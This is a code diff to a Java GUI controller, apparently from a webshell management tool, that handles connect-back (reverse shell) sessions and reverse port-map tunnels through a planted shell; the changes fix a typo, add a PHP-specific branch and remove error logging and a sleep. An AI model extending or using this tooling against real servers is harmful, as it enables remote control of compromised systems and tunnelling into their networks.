@@ -201,9 +201,9 @@ public class ReverseViewController {
                            resultObj = this.currentShellService.connectBack(type, actualTargetIP, targetPort);
                            String status = resultObj.getString("status");
                            if (status.equals("fail")) {
-                              final JSONObject fianlResultObj = resultObj;
+                              final JSONObject finalResultObj = resultObj;
                               Platform.runLater(() -> {
-                                 String msg = fianlResultObj.getString("msg");
+                                 String msg = finalResultObj.getString("msg");
                                  this.statusLabel.setText("反弹失败:" + msg);
                               });
                            } else {
@@ -288,17 +288,21 @@ public class ReverseViewController {
       Runnable worker = () -> {
          try {
             JSONObject result = new JSONObject();
-            result.put("status", (Object)"success");
-            Runnable backgroudRunner = () -> {
-               try {
-                  this.currentShellService.createReversePortMap(listenPort);
-               } catch (Exception var3) {
-                  var3.printStackTrace();
-               }
+            if (this.shellEntity.get("type").equals("php")) {
+               result.put("status", (Object)"success");
+               Runnable backgroudRunner = () -> {
+                  try {
+                     this.currentShellService.createReversePortMap(listenPort);
+                  } catch (Exception var3) {
+                  }
 
-            };
-            (new Thread(backgroudRunner)).start();
-            Thread.sleep(2000L);
+               };
+               (new Thread(backgroudRunner)).start();
+               Thread.sleep(2000L);
+            } else {
+               result = this.currentShellService.createReversePortMap(listenPort);
+            }
+
             if (result.get("status").equals("success")) {
                result = this.currentShellService.listReversePortMap();
                Map paramMap = new HashMap();
@@ -318,9 +322,9 @@ public class ReverseViewController {
                   this.statusLabel.setText("通信隧道创建失败：" + msg);
                });
             }
-         } catch (Exception var8) {
+         } catch (Exception var7) {
             Platform.runLater(() -> {
-               this.statusLabel.setText("通信隧道创建失败：" + var8.getMessage());
+               this.statusLabel.setText("通信隧道创建失败：" + var7.getMessage());
             });
          }
 
@@ -400,7 +404,6 @@ public class ReverseViewController {
 
                   Thread.sleep(3000L);
                } catch (Exception var18) {
-                  var18.printStackTrace();
                   break;
                }
             }
@@ -417,7 +420,6 @@ public class ReverseViewController {
 
                while(true) {
                   try {
-                     Thread.sleep(100L);
                      buf = ReverseViewController.this.currentShellService.readReversePortMapData(socketHashx);
                      socket.getOutputStream().write(buf);
                      socket.getOutputStream().flush();
